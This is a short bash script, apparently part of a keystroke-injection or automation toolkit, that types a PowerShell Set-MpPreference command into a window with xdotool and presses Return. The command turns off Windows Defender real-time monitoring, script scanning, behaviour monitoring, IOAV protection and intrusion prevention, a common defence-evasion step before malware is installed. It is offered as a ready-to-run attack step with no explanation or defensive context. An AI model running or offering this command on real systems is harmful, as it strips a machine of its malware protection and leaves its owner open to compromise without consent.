#!/bin/bash

: '
Disable defender
'

paste_command "Set-MpPreference -DisableRealtimeMonitoring \$true -DisableScriptScanning \$true -DisableBehaviorMonitoring \$true -DisableIOAVProtection \$true -DisableIntrusionPreventionSystem \$true"
xdotool key Return
